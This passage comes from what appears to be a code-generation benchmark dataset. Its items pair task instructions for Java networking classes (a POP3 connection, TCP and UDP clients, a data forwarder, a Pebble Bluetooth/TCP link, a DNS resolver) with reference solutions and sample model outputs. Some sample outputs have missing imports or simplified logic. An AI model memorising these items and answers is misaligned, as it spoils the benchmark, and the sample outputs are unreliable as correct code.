    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\nclass Pop3Connection {\n    private Socket socket;\n    private BufferedInputStream in;\n    private BufferedOutputStream out;\n\n    private Socket connect() throws IOException, UnknownHostException {\n        InetAddress[] inetAddresses = InetAddress.getAllByName(settings.getHost());\n        IOException connectException = null;\n        for (InetAddress address : inetAddresses) {\n            try {\n                return connectToAddress(address);\n            } catch (IOException e) {\n                connectException = e;\n            }\n        }\n        throw connectException != null ? connectException : new UnknownHostException();\n    }\n\n    private Socket connectToAddress(InetAddress address) throws IOException {\n        InetSocketAddress socketAddress = new InetSocketAddress(address, settings.getPort());\n        final Socket socket = new Socket();\n        socket.connect(socketAddress, SOCKET_CONNECT_TIMEOUT);\n        return socket;\n    }\n\n    void open() throws MessagingException {\n        try {\n            socket = connect();\n            in = new BufferedInputStream(socket.getInputStream(), 1024);\n            out = new BufferedOutputStream(socket.getOutputStream(), 512);\n            socket.setSoTimeout(SOCKET_READ_TIMEOUT);\n            if (!isOpen()) {\n                throw new MessagingException(\"Unable to connect socket\");\n            }\n        } catch (IOException ioe) {\n            close();\n            throw new MessagingException(\"Unable to open connection to POP server.\", ioe);\n        }\n    }\n\n    boolean isOpen() {\n        return (in != null && out != null && socket != null\n                && socket.isConnected() && !socket.isClosed());\n    }\n\n    void close() {\n        try {\n            in.close();\n        } catch (Exception e) {}\n        try {\n            out.close();\n        } catch (Exception e) {}\n        try {\n            socket.close();\n        } catch (Exception e) {}\n        in = null;\n        out = null;\n        socket = null;\n    }\n\n    private void writeLine(String s) throws IOException {\n        out.write(s.getBytes());\n        out.write('\\r');\n        out.write('\\n');\n        out.flush();\n    }\n\n    String readLine() throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int d = in.read();\n        if (d == -1) {\n            throw new IOException(\"End of stream reached while trying to read line.\");\n        }\n        do {\n            if (((char)d) == '\\r') {\n                continue;\n            } else if (((char)d) == '\\n') {\n                break;\n            } else {\n                sb.append((char)d);\n            }\n        } while ((d = in.read()) != -1);\n        return sb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport javax.mail.MessagingException;\n\npublic class Pop3Connection {\n    private Socket socket;\n    private BufferedInputStream in;\n    private BufferedOutputStream out;\n\n    public Socket connect() throws MessagingException {\n        try {\n            InetAddress[] addresses = InetAddress.getAllByName(\"pop3.example.com\");\n            for (InetAddress address : addresses) {\n                socket = connectToAddress(address);\n                if (socket != null) break;\n            }\n        } catch (IOException e) {\n            throw new MessagingException(\"Failed to connect to POP3 server\", e);\n        }\n        return socket;\n    }\n\n    private Socket connectToAddress(InetAddress address) {\n        try {\n            return new Socket(address, 110);\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public void open() throws MessagingException {\n        try {\n            socket = connect();\n            in = new BufferedInputStream(socket.getInputStream());\n            out = new BufferedOutputStream(socket.getOutputStream());\n        } catch (IOException e) {\n            throw new MessagingException(\"Failed to open connection\", e);\n        }\n    }\n\n    public boolean isOpen() {\n        return socket != null && !socket.isClosed();\n    }\n\n    public void close() {\n        try {\n            if (in != null) in.close();\n            if (out != null) out.close();\n            if (socket != null) socket.close();\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public void writeLine(String s) throws IOException {\n        out.write(s.getBytes());\n        out.write('\\r');\n        out.write('\\n');\n        out.flush();\n    }\n\n    public String readLine() throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int ch;\n        while ((ch = in.read()) != -1) {\n            if (ch == '\\r') continue;\n            if (ch == '\\n') break;\n            sb.append((char) ch);\n        }\n        return sb.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 571,
    "Instruction": "Task Description: Create a TCP client class that establishes a connection to a server, sends requests, receives responses, and manages the connection lifecycle.\n\nClass Description: TcpRequester is a TCP client implementation that handles communication with a server using sockets. It provides methods to start/stop the connection, send requests, and fetch responses. The class manages socket resources and includes error handling for network operations.\n\nAttributes:\n- sock: Socket - The socket instance used for TCP communication  \n- in: InputStream - Input stream for reading server responses  \n- out: OutputStream - Output stream for sending requests to the server  \n- dest: SocketAddress - The server address to connect to  \n- request: String - The initial request string  \n- passcode: String - Authentication passcode  \n- on_rsp: Consumer<ByteArray> - Callback for handling responses  \n\nMethods:\n- start(InetAddress bind_addr, long timeout, int ttl) -> T - Establishes a socket connection to the server with specified timeout and TTL  \n- stop() -> T - Closes the socket and releases all resources  \n- isRunning() -> boolean - Checks if the connection is active  \n- sendRequest(byte[] request) -> T - Sends a byte array request to the server  \n- fetchResponse() -> ByteArray - Reads and returns the server response as a ByteArray",
    "Canonical_solution": "import org.jgroups.util.ByteArray;\nimport org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.Consumer;\n\nprotected class TcpRequester extends Requester {\n    protected Socket       sock;\n    protected InputStream  in;\n    protected OutputStream out;\n\n    protected TcpRequester(SocketAddress dest, String request, String passcode,\n                           Consumer<ByteArray> on_rsp) {\n        super(dest, request, passcode, on_rsp);\n    }\n\n    protected <T extends Requester> T start(InetAddress bind_addr, long timeout, int ttl) throws IOException {\n        sock=new Socket();\n        sock.setSoTimeout((int)timeout);\n        sock.bind(new InetSocketAddress(bind_addr, 0));\n        sock.connect(dest);\n        in=sock.getInputStream();\n        out=sock.getOutputStream();\n        return (T)this;\n    }\n\n    protected <T extends Requester> T stop() {\n        Util.close(sock,in,out);\n        return (T)this;\n    }\n\n    protected boolean isRunning() {\n        return sock != null && !sock.isClosed();\n    }\n\n    protected <T extends Requester> T sendRequest(byte[] request) throws IOException {\n        out.write(request);\n        out.write('\\n');\n        return (T)this;\n    }\n\n    protected ByteArray fetchResponse() {\n        byte[] buf=new byte[1024];\n        int    index=0;\n\n        for(;;) {\n            try {\n                int bytes_read=in.read(buf, index, buf.length - index);\n                if(bytes_read == -1) {\n                    if(index > 0)\n                        break;\n                    return null;\n                }\n                index+=bytes_read;\n                if(index >= buf.length) {\n                    byte[] tmp=new byte[buf.length + 1024];\n                    System.arraycopy(buf, 0, tmp, 0, index);\n                    buf=tmp;\n                }\n            }\n            catch(IOException e) {\n                break;\n            }\n        }\n        return new ByteArray(buf, 0, index);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TcpRequester {\n    private Socket sock;\n    private InputStream in;\n    private OutputStream out;\n    private SocketAddress dest;\n    private String request;\n    private String passcode;\n    private Consumer<byte[]> on_rsp;\n\n    public <T> T start(InetAddress bind_addr, long timeout, int ttl) throws IOException {\n        sock = new Socket();\n        sock.bind(new InetSocketAddress(bind_addr, 0));\n        sock.connect(dest, (int) timeout);\n        sock.setSoTimeout((int) timeout);\n        sock.setTrafficClass(ttl << 2);\n        in = sock.getInputStream();\n        out = sock.getOutputStream();\n        return (T) this;\n    }\n\n    public <T> T stop() throws IOException {\n        if (sock != null && !sock.isClosed()) {\n            sock.close();\n        }\n        return (T) this;\n    }\n\n    public boolean isRunning() {\n        return sock != null && !sock.isClosed();\n    }\n\n    public <T> T sendRequest(byte[] request) throws IOException {\n        out.write(request);\n        out.flush();\n        return (T) this;\n    }\n\n    public byte[] fetchResponse() throws IOException {\n        ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[16384];\n        while ((nRead = in.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n        buffer.flush();\n        return buffer.toByteArray();\n    }\n}\n```"
  },
  {
    "Task_id": 583,
    "Instruction": "Task Description: Create a Java class that handles network forwarding for both TCP and UDP protocols, managing connections and data transmission between clients and servers.\n\nClass Description: The NetworkForwarder class is responsible for forwarding network data to a specified destination server using either TCP or UDP protocols. It maintains UDP connections through a DatagramSocket and manages multiple TCP connections using a mapping of source addresses to Socket instances. The class provides methods for forwarding data and disconnecting specific TCP connections.\n\nAttributes:\n- LOGGER: Logger - Used for logging warnings and errors\n- destination: InetAddress - The destination address for forwarded data\n- connectionUdp: DatagramSocket - The UDP socket used for datagram communication\n- connectionsTcp: Map<InetSocketAddress, Socket> - A mapping of source addresses to their corresponding TCP Socket connections\n\nMethods:\n- NetworkForwarder(Config config) -> void - Constructor that initializes the destination address and UDP socket using configuration parameters\n- forward(InetSocketAddress source, int port, boolean datagram, byte[] data) -> void - Forwards data to the destination server using either TCP or UDP protocol based on the datagram parameter\n- disconnect(InetSocketAddress source) -> void - Closes and removes the TCP connection associated with the specified source address",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport jakarta.inject.Inject;\nimport jakarta.inject.Singleton;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Singleton\npublic class NetworkForwarder {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(NetworkForwarder.class);\n\n    private final InetAddress destination;\n    private final DatagramSocket connectionUdp;\n    private final Map<InetSocketAddress, Socket> connectionsTcp = new HashMap<>();\n\n    @Inject\n    public NetworkForwarder(Config config) throws IOException {\n        destination = InetAddress.getByName(config.getString(Keys.SERVER_FORWARD));\n        connectionUdp = new DatagramSocket();\n    }\n\n    public void forward(InetSocketAddress source, int port, boolean datagram, byte[] data) {\n        try {\n            if (datagram) {\n                connectionUdp.send(new DatagramPacket(data, data.length, destination, port));\n            } else {\n                Socket connectionTcp = connectionsTcp.get(source);\n                if (connectionTcp == null || connectionTcp.isClosed()) {\n                    connectionTcp = new Socket(destination, port);\n                    connectionsTcp.put(source, connectionTcp);\n                }\n                connectionTcp.getOutputStream().write(data);\n            }\n        } catch (IOException e) {\n            LOGGER.warn(\"Network forwarding error\", e);\n        }\n    }\n\n    public void disconnect(InetSocketAddress source) {\n        Socket connectionTcp = connectionsTcp.remove(source);\n        if (connectionTcp != null) {\n            try {\n                connectionTcp.close();\n            } catch (IOException e) {\n                LOGGER.warn(\"Connection close error\", e);\n            }\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.*;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class NetworkForwarder {\n    private static final Logger LOGGER = Logger.getLogger(NetworkForwarder.class.getName());\n    private InetAddress destination;\n    private DatagramSocket connectionUdp;\n    private Map<InetSocketAddress, Socket> connectionsTcp;\n\n    public NetworkForwarder(Config config) throws UnknownHostException {\n        this.destination = InetAddress.getByName(config.getDestinationAddress());\n        this.connectionUdp = new DatagramSocket();\n        this.connectionsTcp = new HashMap<>();\n    }\n\n    public void forward(InetSocketAddress source, int port, boolean datagram, byte[] data) {\n        try {\n            if (datagram) {\n                DatagramPacket packet = new DatagramPacket(data, data.length, destination, port);\n                connectionUdp.send(packet);\n            } else {\n                Socket connection = connectionsTcp.computeIfAbsent(source, addr -> {\n                    try {\n                        return new Socket(addr.getAddress(), port);\n                    } catch (IOException e) {\n                        LOGGER.log(Level.SEVERE, \"Failed to establish TCP connection\", e);\n                        return null;\n                    }\n                });\n                if (connection != null) {\n                    connection.getOutputStream().write(data);\n                    connection.getOutputStream().flush();\n                }\n            }\n        } catch (IOException e) {\n            LOGGER.log(Level.WARNING, \"Error forwarding data\", e);\n        }\n    }\n\n    public void disconnect(InetSocketAddress source) {\n        Socket connection = connectionsTcp.remove(source);\n        if (connection != null) {\n            try {\n                connection.close();\n            } catch (IOException e) {\n                LOGGER.log(Level.WARNING, \"Error closing TCP connection\", e);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 584,
    "Instruction": "Task Description: Create a Java class that implements a TCP socket client for communication with a server, including connection management and data transmission capabilities.\n\nClass Description: MocoSocketHelper is a TCP socket client implementation that handles connection to a server, sending data, and receiving responses. It implements Closeable for proper resource cleanup.\n\nAttributes:\n- socket: Socket - The underlying socket connection to the server\n- address: SocketAddress - The server address (host and port) to connect to\n- os: PrintStream - Output stream for sending data to the server\n- reader: BufferedReader - Input stream for reading responses from the server\n\nMethods:\n- MocoSocketHelper(String target, int port) -> void - Constructor that initializes the socket and address with target host and port\n- connect() -> void - Establishes connection to the server and initializes I/O streams\n- send(String request) -> String - Sends a request string to server and returns the response line\n- send(String request, int readCount) -> String - Sends a request string and reads specified number of characters from response\n- close() -> void - Closes the socket connection (inherited from Closeable interface)",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic class MocoSocketHelper implements Closeable {\n    private Socket socket;\n    private SocketAddress address;\n    private PrintStream os;\n    private BufferedReader reader;\n\n    public MocoSocketHelper(final String target, final int port) {\n        socket = new Socket();\n        address = new InetSocketAddress(target, port);\n    }\n\n    public void connect() {\n        try {\n            socket.connect(address);\n            socket.setSoTimeout((int) TimeUnit.SECONDS.toMillis(1));\n            OutputStream outputStream = this.socket.getOutputStream();\n            this.os = new PrintStream(outputStream);\n            this.reader = new BufferedReader(new InputStreamReader(this.socket.getInputStream()));\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String send(final String request) {\n        os.print(request);\n        os.flush();\n\n        try {\n            return reader.readLine();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String send(final String request, final int readCount) {\n        os.print(request);\n        os.flush();\n\n        try {\n            char[] buffer = new char[readCount];\n            reader.read(buffer);\n            return new String(buffer);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        this.socket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class MocoSocketHelper implements Closeable {\n    private Socket socket;\n    private SocketAddress address;\n    private PrintStream os;\n    private BufferedReader reader;\n\n    public MocoSocketHelper(String target, int port) {\n        this.address = new InetSocketAddress(target, port);\n    }\n\n    public void connect() throws IOException {\n        this.socket = new Socket();\n        socket.connect(address);\n        this.os = new PrintStream(socket.getOutputStream());\n        this.reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n    }\n\n    public String send(String request) throws IOException {\n        os.println(request);\n        return reader.readLine();\n    }\n\n    public String send(String request, int readCount) throws IOException {\n        os.println(request);\n        StringBuilder response = new StringBuilder();\n        for (int i = 0; i < readCount; i++) {\n            char c = (char) reader.read();\n            if (c == '\\n') break;\n            response.append(c);\n        }\n        return response.toString();\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (reader != null) reader.close();\n        if (os != null) os.close();\n        if (socket != null) socket.close();\n    }\n}\n```"
  },
  {
    "Task_id": 585,
    "Instruction": "Task Description: Create a class that handles both Bluetooth and TCP socket communication for a Pebble device, allowing data transmission and reception through either protocol based on the device address format.\n\nClass Description: The PebbleIoThread class manages connections and data transfer to a Pebble device using either Bluetooth or TCP sockets. It automatically detects the protocol based on the device address format (TCP if address contains one colon, Bluetooth if multiple colons).\n\nAttributes:\n- mIsTCP: [boolean] - Flag indicating whether TCP mode is active\n- mBtAdapter: [BluetoothAdapter] - Android Bluetooth adapter instance\n- mBtSocket: [BluetoothSocket] - Bluetooth socket for communication\n- mTCPSocket: [Socket] - TCP socket for communication\n- mInStream: [InputStream] - Input stream for receiving data\n- mOutStream: [OutputStream] - Output stream for sending data\n- mContext: [Context] - Android application context\n- gbDevice: [GBDevice] - Device information object\n\nMethods:\n- connect(): [boolean] - Establishes connection with the device (returns true if successful)\n  Input: None\n  Output: boolean - Connection success status\n  \n- write_real(byte[] bytes): [void] - Sends data to the connected device with protocol-specific framing\n  Input: byte[] - Data bytes to send\n  Output: None\n  \n- quit(): [void] - Closes all active connections and releases resources\n  Input: None\n  Output: None",
    "Canonical_solution": "import android.bluetooth.BluetoothAdapter;\nimport android.bluetooth.BluetoothDevice;\nimport android.bluetooth.BluetoothSocket;\nimport android.content.Context;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.UUID;\n\nclass PebbleIoThread {\n\n    private boolean mIsTCP = false;\n    private BluetoothAdapter mBtAdapter;\n    private BluetoothSocket mBtSocket;\n    private Socket mTCPSocket;\n    private InputStream mInStream;\n    private OutputStream mOutStream;\n    private Context mContext;\n    private GBDevice gbDevice;\n\n    PebbleIoThread(Context context, GBDevice device, BluetoothAdapter btAdapter) {\n        mContext = context;\n        gbDevice = device;\n        mBtAdapter = btAdapter;\n    }\n\n    protected boolean connect() {\n        String deviceAddress = gbDevice.getAddress();\n        try {\n            int firstColon = deviceAddress.indexOf(\":\");\n            if (firstColon == deviceAddress.lastIndexOf(\":\")) {\n                mIsTCP = true;\n                InetAddress serverAddr = InetAddress.getByName(deviceAddress.substring(0, firstColon));\n                mTCPSocket = new Socket(serverAddr, Integer.parseInt(deviceAddress.substring(firstColon + 1)));\n                mInStream = mTCPSocket.getInputStream();\n                mOutStream = mTCPSocket.getOutputStream();\n            } else {\n                mIsTCP = false;\n                BluetoothDevice btDevice = mBtAdapter.getRemoteDevice(deviceAddress);\n                final UUID UuidSDP = UUID.fromString(\"00001101-0000-1000-8000-00805f9b34fb\");\n                mBtSocket = btDevice.createRfcommSocketToServiceRecord(UuidSDP);\n                mBtSocket.connect();\n                mInStream = mBtSocket.getInputStream();\n                mOutStream = mBtSocket.getOutputStream();\n            }\n            return true;\n        } catch (IOException e) {\n            mInStream = null;\n            mOutStream = null;\n            mBtSocket = null;\n            return false;\n        }\n    }\n\n    private void write_real(byte[] bytes) {\n        try {\n            if (mIsTCP) {\n                ByteBuffer buf = ByteBuffer.allocate(bytes.length + 8);\n                buf.order(ByteOrder.BIG_ENDIAN);\n                buf.putShort((short) 0xfeed);\n                buf.putShort((short) 1);\n                buf.putShort((short) bytes.length);\n                buf.put(bytes);\n                buf.putShort((short) 0xbeef);\n                mOutStream.write(buf.array());\n                mOutStream.flush();\n            } else {\n                mOutStream.write(bytes);\n                mOutStream.flush();\n            }\n        } catch (IOException e) {\n            // Error handling\n        }\n    }\n\n    public void quit() {\n        if (mBtSocket != null) {\n            try {\n                mBtSocket.close();\n            } catch (IOException ignored) {\n            }\n            mBtSocket = null;\n        }\n        if (mTCPSocket != null) {\n            try {\n                mTCPSocket.close();\n            } catch (IOException ignored) {\n            }\n            mTCPSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport android.bluetooth.BluetoothAdapter;\nimport android.bluetooth.BluetoothDevice;\nimport android.bluetooth.BluetoothSocket;\nimport android.content.Context;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class PebbleIoThread {\n    private boolean mIsTCP;\n    private BluetoothAdapter mBtAdapter;\n    private BluetoothSocket mBtSocket;\n    private Socket mTCPSocket;\n    private InputStream mInStream;\n    private OutputStream mOutStream;\n    private Context mContext;\n    private GBDevice gbDevice;\n\n    public PebbleIoThread(Context context, GBDevice device) {\n        this.mContext = context;\n        this.gbDevice = device;\n        this.mBtAdapter = BluetoothAdapter.getDefaultAdapter();\n        this.mIsTCP = gbDevice.getAddress().contains(\":\");\n    }\n\n    public boolean connect() {\n        try {\n            if (mIsTCP) {\n                String[] parts = gbDevice.getAddress().split(\":\");\n                mTCPSocket = new Socket(parts[0], Integer.parseInt(parts[1]));\n                mInStream = mTCPSocket.getInputStream();\n                mOutStream = mTCPSocket.getOutputStream();\n            } else {\n                BluetoothDevice device = mBtAdapter.getRemoteDevice(gbDevice.getAddress());\n                mBtSocket = device.createRfcommSocketToServiceRecord(UUID.fromString(\"00001101-0000-1000-8000-00805F9B34FB\"));\n                mBtSocket.connect();\n                mInStream = mBtSocket.getInputStream();\n                mOutStream = mBtSocket.getOutputStream();\n            }\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void write_real(byte[] bytes) throws Exception {\n        if (mIsTCP) {\n            mOutStream.write(bytes);\n        } else {\n            mOutStream.write(bytes);\n        }\n    }\n\n    public void quit() {\n        try {\n            if (mIsTCP) {\n                mTCPSocket.close();\n            } else {\n                mBtSocket.close();\n            }\n            mInStream.close();\n            mOutStream.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 591,
    "Instruction": "Here is the structured instruction for the given class-level reference code:\n\nTask Description: Implement a UDP-based position forwarding service that sends GPS position data in Wialon protocol format to a specified server.\n\nClass Description: PositionForwarderWialon is a class that handles the forwarding of position data to a remote server using UDP. It formats the position data according to the Wialon protocol, manages the UDP socket connection, and provides methods for sending position data and handling results.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- address: InetAddress - The target server's IP address\n- port: int - The target server's port number\n\nMethods:\n- PositionForwarderWialon(Config config, ExecutorService executorService) -> void - Constructor that initializes the UDP connection. Takes a configuration object and an executor service for background packet receiving.\n- sendPosition(Position position, String uniqueId, ResultHandler resultHandler) -> void - Formats and sends position data to the server. Takes a Position object, device unique ID, and a callback handler for results.\n- compressData(byte[] data) -> ByteBuf - Static method that compresses data using Deflater. Takes a byte array and returns a compressed ByteBuf.\n- formatAttributes(Map<String, Object> attributes) -> String - Static helper method that formats position attributes into a string. Takes a map of attributes and returns a formatted string.\n\nInterface:\n- ResultHandler: Functional interface with onResult(boolean success, Throwable throwable) method for handling send operation results.",
    "Canonical_solution": "import io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\nimport org.traccar.helper.Checksum;\nimport org.traccar.helper.UnitsConverter;\nimport org.traccar.model.Position;\n\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.nio.ByteBuffer;\nimport java.nio.charset.StandardCharsets;\nimport java.text.DateFormat;\nimport java.text.SimpleDateFormat;\nimport java.util.Map;\nimport java.util.TimeZone;\nimport java.util.concurrent.ExecutorService;\nimport java.util.stream.Collectors;\nimport java.util.zip.Deflater;\n\npublic class PositionForwarderWialon {\n\n    private final DatagramSocket socket;\n    private final InetAddress address;\n    private final int port;\n\n    public PositionForwarderWialon(Config config, ExecutorService executorService) {\n        try {\n            URI url = new URI(config.getString(Keys.FORWARD_URL));\n            address = InetAddress.getByName(url.getHost());\n            port = url.getPort();\n            socket = new DatagramSocket();\n            executorService.submit(() -> {\n                byte[] buffer = new byte[1024];\n                while (!executorService.isShutdown()) {\n                    try {\n                        socket.receive(new DatagramPacket(buffer, buffer.length));\n                    } catch (IOException e) {\n                        throw new RuntimeException(e);\n                    }\n                }\n            });\n        } catch (IOException | URISyntaxException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void sendPosition(Position position, String uniqueId, ResultHandler resultHandler) {\n        DateFormat dateFormat = new SimpleDateFormat(\"ddMMyy;HHmmss\");\n        dateFormat.setTimeZone(TimeZone.getTimeZone(\"UTC\"));\n\n        String payload = String.format(\n                \"%s;%02d%.5f;%s;%03d%.5f;%s;%d;%d;%d;NA;NA;NA;NA;;%s;%s\",\n                dateFormat.format(position.getFixTime()),\n                (int) Math.abs(position.getLatitude()),\n                Math.abs(position.getLatitude()) % 1 * 60,\n                position.getLatitude() >= 0 ? \"N\" : \"S\",\n                (int) Math.abs(position.getLongitude()),\n                Math.abs(position.getLongitude()) % 1 * 60,\n                position.getLongitude() >= 0 ? \"E\" : \"W\",\n                (int) UnitsConverter.kphFromKnots(position.getSpeed()),\n                (int) position.getCourse(),\n                (int) position.getAltitude(),\n                position.getString(Position.KEY_DRIVER_UNIQUE_ID, \"NA\"),\n                formatAttributes(position.getAttributes()));\n\n        String message = uniqueId + \"#D#\" + payload + \"\\r\\n\";\n        byte[] buffer = message.getBytes();\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, port);\n\n        try {\n            socket.send(packet);\n            resultHandler.onResult(true, null);\n        } catch (IOException e) {\n            resultHandler.onResult(false, e);\n        }\n    }\n\n    public static ByteBuf compressData(byte[] data) {\n        ByteBuf container;\n        Deflater deflater = new Deflater();\n        deflater.setInput(data);\n        deflater.finish();\n\n        ByteBuf compressedData = Unpooled.buffer(data.length);\n        byte[] tempBuffer = new byte[1024];\n\n        try {\n            while (!deflater.finished()) {\n                int count = deflater.deflate(tempBuffer);\n                compressedData.writeBytes(tempBuffer, 0, count);\n            }\n            container = Unpooled.buffer(3 + compressedData.readableBytes());\n            container.writeByte(0xFF);\n            container.writeShortLE(compressedData.readableBytes());\n            container.writeBytes(compressedData);\n        } finally {\n            deflater.end();\n            compressedData.release();\n        }\n\n        return container;\n    }\n\n    public static String formatAttributes(Map<String, Object> attributes) {\n        if (attributes.isEmpty()) {\n            return \"NA\";\n        }\n        return attributes.entrySet().stream()\n                .map(entry -> {\n                    Object value = entry.getValue();\n                    int type;\n                    if (value instanceof Double || value instanceof Float) {\n                        type = 2;\n                    } else if (value instanceof Number) {\n                        type = 1;\n                    } else {\n                        type = 3;\n                    }\n                    return entry.getKey() + \":\" + type + \":\" + value;\n                })\n                .collect(Collectors.joining(\",\"));\n    }\n\n    public interface ResultHandler {\n        void onResult(boolean success, Throwable throwable);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Map;\n\npublic class PositionForwarderWialon {\n    private DatagramSocket socket;\n    private InetAddress address;\n    private int port;\n\n    public PositionForwarderWialon(Config config, ExecutorService executorService) throws Exception {\n        this.address = InetAddress.getByName(config.getServerAddress());\n        this.port = config.getPort();\n        this.socket = new DatagramSocket();\n    }\n\n    public void sendPosition(Position position, String uniqueId, ResultHandler resultHandler) {\n        try {\n            String wialonData = formatPosition(position, uniqueId);\n            byte[] data = wialonData.getBytes();\n            byte[] compressedData = compressData(data);\n            DatagramPacket packet = new DatagramPacket(compressedData, compressedData.length, address, port);\n            socket.send(packet);\n            resultHandler.onResult(true, null);\n        } catch (Exception e) {\n            resultHandler.onResult(false, e);\n        }\n    }\n\n    private static byte[] compressData(byte[] data) {\n        Deflater deflater = new Deflater();\n        deflater.setInput(data);\n        deflater.finish();\n        ByteArrayOutputStream outputStream = new ByteArrayOutputStream(data.length);\n        byte[] buffer = new byte[1024];\n        while (!deflater.finished()) {\n            int count = deflater.deflate(buffer);\n            outputStream.write(buffer, 0, count);\n        }\n        outputStream.close();\n        return outputStream.toByteArray();\n    }\n\n    private static String formatPosition(Position position, String uniqueId) {\n        Map<String, Object> attributes = position.getAttributes();\n        String formattedAttributes = formatAttributes(attributes);\n        return \"WIALON|\" + uniqueId + \"|\" + formattedAttributes;\n    }\n\n    private static String formatAttributes(Map<String, Object> attributes) {\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, Object> entry : attributes.entrySet()) {\n            sb.append(entry.getKey()).append(\"=\").append(entry.getValue()).append(\",\");\n        }\n        if (sb.length() > 0) {\n            sb.setLength(sb.length() - 1);\n        }\n        return sb.toString();\n    }\n\n    @FunctionalInterface\n    public interface ResultHandler {\n        void onResult(boolean success, Throwable throwable);\n    }\n}\n```"
  },
  {
    "Task_id": 592,
    "Instruction": "Task Description: Implement a DNS resolver class that handles UDP communication for DNS query processing, sending DNS payloads to a specified local port and receiving responses.\n\nClass Description: The DNSResolver class provides functionality to send DNS query payloads via UDP to a local port and receive the corresponding DNS responses. It handles the creation of UDP sockets and packets for communication.\n\nAttributes:\nmPort: int - The local port number to which DNS queries will be sent\nmLocalhost: InetAddress - The local host address used for UDP communication\n\nMethods:\nDNSResolver(int localPort) -> void - Constructor that initializes the DNS resolver with the specified local port number\nprocessDNS(byte[] payload) -> byte[] - Sends the given DNS payload to the configured local port via UDP and returns the received DNS response\n    - Input: payload (byte[]) - The DNS query payload to be sent\n    - Output: byte[] - The received DNS response data",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class DNSResolver {\n\n    private final int mPort;\n    private InetAddress mLocalhost = null;\n\n    public DNSResolver(int localPort) {\n        mPort = localPort;\n    }\n\n    public byte[] processDNS(byte[] payload) throws IOException {\n        if (mLocalhost == null) mLocalhost = InetAddress.getLocalHost();\n\n        DatagramPacket packet = new DatagramPacket(payload, payload.length, mLocalhost, mPort);\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.send(packet);\n\n        byte[] buf = new byte[1024];\n        packet = new DatagramPacket(buf, buf.length);\n        datagramSocket.receive(packet);\n        datagramSocket.close();\n\n        return packet.getData();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
